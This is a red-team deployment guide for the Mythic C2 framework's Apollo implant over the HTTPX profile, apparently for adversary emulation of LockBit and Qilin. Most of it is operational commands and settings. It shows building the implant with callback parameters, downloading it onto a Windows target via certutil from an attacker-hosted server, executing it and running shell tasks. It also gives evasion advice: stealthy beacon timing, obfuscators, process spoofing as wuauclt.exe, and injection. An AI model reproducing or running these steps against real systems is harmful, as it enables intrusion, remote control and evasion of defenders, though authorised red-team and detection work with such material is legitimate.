# Apollo HTTPX Deployment Guide

> **Active C2 config (source-of-truth): [`c2_profile/ACTIVE-CONFIG.md`](c2_profile/ACTIVE-CONFIG.md).**
> There is one config per intent: `generic_cdn_beacon.lab.toml` (LAB-ONLY, HTTP:82, **not** actor
> coverage) and `generic_cdn_beacon.ops.toml` (generic hardened shape). For **actor-attributed**
> runs, load `../profiles/lockbit-icbc.httpx.toml` or `../profiles/qilin-ocsp.httpx.toml` as
> `raw_c2_config` on the redirector:443 ops build. The old `fin8_cdn`/`httpx_config_*`/
> `httpx_minimal.json` variants were removed (F9); `fin8_cdn` was a misnomer (F1).

## Quick Start (5 min)

```bash
# 1. SSH to Mythic via Proxmox jump
sshpass -p "password" ssh -o ProxyCommand="ssh -W %h:%p root@192.168.36.225" localuser@10.23.20.10

# 2. Deploy fixed Apollo.cs
sudo cp apollo/Apollo.cs /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs

# 3. Verify httpx profile
ls -l /opt/mythic/InstalledServices/httpx/httpx/c2_code/agent_configs.json

# 4. Access Mythic UI
# Browser: https://localhost:7443
# Or React UI: http://localhost:3000
```

## Detailed Deployment Steps

### Phase 1: Pre-Flight Checks (2 min)

#### Verify Mythic Server Status
```bash
# From Mythic server
cd /opt/mythic
sudo ./mythic-cli health

# Expected output:
# Container: mythic_mythic                  Status: healthy
# Container: mythic_graphql                 Status: healthy  
# Container: httpx                          Status: healthy
```

#### Check httpx Container
```bash
# Verify httpx is running and healthy
sudo docker ps | grep httpx
# Expected: UP and healthy

# Check logs
sudo docker logs httpx | tail -20
# Should show: "listening on port 7006" or similar
```

#### Verify Callback Port
```bash
# Check port 82 is open internally
sudo ss -tlnp | grep 82
# Expected: LISTEN 127.0.0.1:82 (or similar)
```

### Phase 2: Deploy Apollo.cs Fix (1 min)

#### Get Current Version
```bash
# Backup original
sudo cp /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs \
        /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs.backup

# Verify backup
ls -l /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs*
```

#### Deploy Fixed Version
```bash
# From this repo (track3-apollo-agent/)
cat agent_code/Apollo.cs | sudo tee /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs > /dev/null

# Verify deployment
sudo grep -n "reconnectAttempts" /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs
# Should show: lines with "int reconnectAttempts" and "MAX_RECONNECT_ATTEMPTS"
```

### Phase 3: Configure HTTPX Profile (1 min)

#### Deploy Profile Configuration
```bash
# Backup original
sudo cp /opt/mythic/InstalledServices/httpx/httpx/c2_code/agent_configs.json \
        /opt/mythic/InstalledServices/httpx/httpx/c2_code/agent_configs.json.backup

# Deploy updated config with callback_domains
cat > /tmp/agent_configs_update.json << 'EOF'
{
  "fin8_cdn": {
    "name": "fin8_cdn",
    "callback_domains": ["http://10.23.20.10:82"],
    "callback_interval": 62,
    "callback_jitter": 37,
    "get": {...},
    "post": {...}
  }
}
EOF

sudo cp /tmp/agent_configs_update.json \
        /opt/mythic/InstalledServices/httpx/httpx/c2_code/agent_configs.json

# Verify
sudo jq .fin8_cdn.callback_domains /opt/mythic/InstalledServices/httpx/httpx/c2_code/agent_configs.json
# Expected: ["http://10.23.20.10:82"]
```

### Phase 4: Verify Apollo Supports HTTPX (30 sec)

```bash
# Check Apollo builder.py confirms httpx support
sudo grep "c2_profiles = " /opt/mythic/InstalledServices/apollo/apollo/mythic/agent_functions/builder.py
# Expected: ["http", "httpx", "smb", "tcp", "websocket", "azure_blob"]
```

### Phase 5: Access Mythic UI & Create Payload (3 min) — LAB-ONLY

> **LAB-ONLY build.** The parameters in this phase (raw IP `10.23.20.10`, port `82`, empty
> `httpx_raw_c2_config`, cleartext HTTP) reproduce **no documented actor** and MUST NOT be
> counted as FIN8/LockBit/Qilin coverage. This is the Run-1 baseline (static tells) only.
> For a monitored / actor-attributed run, use **Phase 5b** below instead.

#### Setup SSH Tunnel to Web UI
```bash
# From local Mac/Linux
ssh -L 7443:127.0.0.1:7443 -J root@192.168.36.225 localuser@10.23.20.10

# Then open browser:
# https://localhost:7443
# Accept SSL warning
# Login: mythic_admin / [password from .env]
```

#### Create Payload via UI
**Menu:** Payloads → Create Payload

**Settings:**
| Field | Value |
|-------|-------|
| Payload Type | apollo |
| C2 Profile | httpx |
| Filename | apollo.exe |
| Description | Apollo HTTPX Red Team |
| Selected OS | Windows |

**C2 Profile Parameters:**
| Parameter | Value |
|-----------|-------|
| httpx_callback_domains | http://10.23.20.10:82 |
| httpx_callback_interval | 62 |
| httpx_callback_jitter | 37 |
| httpx_domain_rotation | fail-over |
| httpx_failover_threshold | 5 |
| httpx_encrypted_exchange_check | true |
| httpx_killdate | -1 |
| httpx_raw_c2_config | (leave empty) |
| httpx_proxy_host | (leave empty) |
| httpx_proxy_port | (leave empty) |
| httpx_proxy_user | (leave empty) |
| httpx_proxy_pass | (leave empty) |
| httpx_domain_front | (leave empty) |
| httpx_timeout | 240 |

**Click:** GENERATE → Download apollo.exe

### Phase 5b: Ops-representative build (MONITORED runs) — actor-attributed

Use this for any run against monitoring. It callbacks to the **redirector FQDN on 443** and
loads an **actor profile** as `raw_c2_config`. See `c2_profile/ACTIVE-CONFIG.md`.

**C2 Profile Parameters (LockBit example):**
| Parameter | Value |
|-----------|-------|
| httpx_callback_domains | `https://<REDIR_FQDN>:443` (redirector, real LE cert — exercises N6) |
| httpx_raw_c2_config | contents of `../profiles/lockbit-icbc.httpx.toml` |
| httpx_callback_interval | 62 |
| httpx_callback_jitter | 37 |
| httpx_domain_rotation | fail-over |
| httpx_failover_threshold | 5 |
| httpx_encrypted_exchange_check | true |
| httpx_domain_front | (leave empty — fronting is dead on major CDNs, see PAYLOAD-CONFIG-REFERENCE.md) |

Host-side actor items (LockBit): set `spawnto` = `wuauclt.exe` and the SMB pipe `fullduplex_84`,
then drive one injection task (exercises H2/H3). See `HOST-EMULATION-LOCKBIT.md`.

> The **generic** `generic_cdn_beacon.ops.toml` may be used for network-hygiene testing (N3/N6)
> but is **not** actor coverage. Only the actor profiles above count as LockBit/Qilin coverage.

### Phase 6: Deploy to Target (2 min)

#### Transfer Payload
```bash
# From Kali gateway (192.168.36.100)
python3 -m http.server --bind 192.168.36.100 8000 --directory ~/payloads &

# From target (WS01 / VMID 121)
certutil -urlcache -f http://192.168.36.100:8000/apollo.exe %temp%\apollo.exe
```

#### Execute
```cmd
REM On target
%temp%\apollo.exe

REM Verify execution
tasklist | findstr apollo
```

### Phase 7: Verify Callback (1-2 min)

#### Check Mythic UI
- **Menu:** Callbacks
- Wait up to 62 seconds
- Apollo callback should appear with:
  - UUID: [unique identifier]
  - User: [domain\username]
  - Hostname: [computer name]
  - IPs: [network interfaces]
  - OS: [Windows version]
  - Arch: x64 or x86

#### Check via CLI (if UI unavailable)
```bash
# On Mythic server
curl -s http://localhost:8080/v1/graphql \
  -H "Content-Type: application/json" \
  -H "X-MYTHIC-AUTH: [token]" \
  -d '{"query": "query { callback { user host os } }"}' | jq .
```

### Phase 8: Test Task Execution (1 min)

#### Queue Task
- **Menu:** Callbacks → [apollo callback] → Interact
- **Command:** shell
- **Arguments:** whoami
- **Send**

#### Verify Execution
- Task status changes: "processing" → "completed"
- Output displays: `DOMAIN\USERNAME`
- Task completion time: ~2-5 seconds (one checkin cycle)

## Troubleshooting

### Callback Never Appears

**Symptom:** apollo.exe runs, but no callback in Mythic UI after 2 minutes

**Diagnosis:**
```bash
# 1. Check apollo.exe is running on target
tasklist | findstr apollo

# 2. Check network connectivity from target to Mythic
nslookup 10.23.20.10
ping -n 1 10.23.20.10  (may be blocked)
telnet 10.23.20.10 82  (should connect)

# 3. Check Mythic is listening
sudo ss -tlnp | grep -E "82|7443"

# 4. Check httpx container logs
sudo docker logs httpx | tail -50 | grep -i error

# 5. Verify apollo.exe is .NET compiled
file apollo.exe  (should be "PE32+ executable")
```

**Fix:**
1. Rebuild apollo.exe with current fixes
2. Verify network route: target → Mythic:82 is open
3. Check httpx profile has `callback_domains: ["http://10.23.20.10:82"]`
4. Restart httpx container: `sudo docker restart httpx`

### Tasks Stuck at "processing"

**Symptom:** Callback appears, but tasks never complete

**Diagnosis:**
```bash
# 1. Check apollo.exe version (should have Start() fix)
sudo md5sum apollo.exe  (compare hash with expected)

# 2. Check agent logs on target (if available)
Get-EventLog -LogName Application | grep apollo

# 3. Check Mythic task queue
# UI: Callbacks → [callback] → Tasks → View logs
```

**Fix:**
1. Verify apollo.exe was built AFTER Apollo.cs fix was deployed
2. Reboot target: `shutdown /r /t 0`
3. Terminate old process: `taskkill /IM apollo.exe /F`
4. Deploy fresh apollo.exe
5. Re-execute

### Connection Refused (telnet fails)

**Symptom:** Cannot connect to 10.23.20.10:82 from target

**Diagnosis:**
```bash
# On Mythic server
sudo iptables -L -n | grep 82
sudo firewall-cmd --list-ports

# Check docker networking
sudo docker network ls
sudo docker network inspect mythic_default | grep -i gateway
```

**Fix:**
1. Restart Mythic: `sudo ./mythic-cli restart`
2. Verify port binding: `sudo ss -tlnp | grep 82`
3. If port not showing, check docker port mappings:
   ```bash
   sudo docker ps | grep mythic_mythic
   sudo docker port mythic_mythic 82
   ```

### HTTPX Profile Not Available in UI

**Symptom:** "httpx" not in C2 Profile dropdown when creating payload

**Diagnosis:**
```bash
# Check httpx container status
sudo docker ps | grep httpx
# Should show "healthy"

# Check if httpx is crashing
sudo docker logs httpx | grep -E "Terminated|crash|error"

# Check if profile is registered
sudo docker ps | grep -i profile | head -5
```

**Fix:**
1. Restart httpx: `sudo docker restart httpx`
2. Wait 30 seconds for registration
3. Refresh browser
4. If still not available, rebuild httpx:
   ```bash
   cd /opt/mythic
   sudo ./mythic-cli build httpx
   ```

### EKE Handshake Fails

**Symptom:** Callback appears but tasks never execute; logs show encryption errors

**Diagnosis:**
```bash
# Check RSA key generation
# UI: Callbacks → [callback] → Agent Info
# Look for: "Encrypted Exchange Check: true"

# Check Mythic logs
sudo docker logs mythic_mythic | grep -i "eke\|encrypt\|rsa"
```

**Fix:**
1. Rebuild apollo.exe with: `httpx_encrypted_exchange_check: true`
2. Verify builder.py doesn't have encryption disabled
3. Check callback RSA key length (should be 4096)
4. If callback already exists, delete it and execute new payload

## Performance Tuning

### Beacon Timing Optimization

**For Stealth (longer beacon):**
- callback_interval: 300 (5 minutes)
- callback_jitter: 50 (50% variation)
- Result: 150-450 second beacon window

**For Responsiveness (shorter beacon):**
- callback_interval: 10 (10 seconds)  
- callback_jitter: 20 (20% variation)
- Result: 8-12 second beacon window

**Production Default (62s + 37%):**
- Balanced for real-world network monitoring
- Mimics LockBit/Qilin malware patterns
- Result: 39-85 second beacon window

### Payload Size Optimization

Current apollo.exe: ~300-400 KB

**Reduce size:**
1. Disable unused transport profiles (Config.cs #define)
2. Use obfuscators (ConfuserEx, yano)
3. Strip debug symbols (release build)

## Automated Deployment Script

```bash
#!/bin/bash
# deploy-apollo.sh

MYTHIC_HOST="10.23.20.10"
MYTHIC_USER="localuser"
MYTHIC_PASS="password"
JUMP_HOST="root@192.168.36.225"

echo "[*] Deploying Apollo HTTPX..."

# SSH to Mythic and deploy
sshpass -p "$MYTHIC_PASS" ssh \
  -o ProxyCommand="ssh -W %h:%p $JUMP_HOST" \
  -o StrictHostKeyChecking=no \
  "$MYTHIC_USER@$MYTHIC_HOST" << 'REMOTE'
  
echo "[*] Backup original Apollo.cs..."
sudo cp /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs \
        /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs.backup

echo "[*] Deploy fixed Apollo.cs..."
# [Copy fixed Apollo.cs here]

echo "[*] Verify httpx config..."
sudo jq .fin8_cdn.callback_domains /opt/mythic/InstalledServices/httpx/httpx/c2_code/agent_configs.json

echo "[+] Deployment complete"
REMOTE

echo "[+] Done!"
```

## Rollback Procedure

If deployment fails or causes issues:

```bash
# On Mythic server
sudo cp /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs.backup \
        /opt/mythic/InstalledServices/apollo/apollo/agent_code/Apollo/Agent/Apollo.cs

sudo cp /opt/mythic/InstalledServices/httpx/httpx/c2_code/agent_configs.json.backup \
        /opt/mythic/InstalledServices/httpx/httpx/c2_code/agent_configs.json

# Restart services
sudo docker restart httpx apollo

echo "Rollback complete"
```

## Operational Security

- **Payload Uniqueness:** Each apollo.exe has unique RSA keypair; reusing payloads compromises operational security
- **Kill Date:** Always set kill date to operation end date (prevents stale beacons)
- **HTTPS:** Use HTTPS callback domains for production (requires valid certificate)
- **Egress (not fronting):** Domain fronting is dead on the major CDNs — leave `domain_front`
  empty and use actor-accurate egress (redirector on 443 + aged registered domains; FIN8 `sslip.io`;
  Qilin forged-OCSP host). See `PAYLOAD-CONFIG-REFERENCE.md` and `OPSEC-HARDENING.md` (F6)
- **Proxy:** Configure proxy_* parameters if target has outbound proxy

## References

- Mythic Docs: https://mythicc2.github.io/
- Apollo GitHub: https://github.com/its-a-feature/Apollo
- HTTPX Profile: https://mythicc2.github.io/Agents/apollo/c2_profiles/httpx/

---

**Last Updated:** 2026-08-25
**Status:** Production Ready
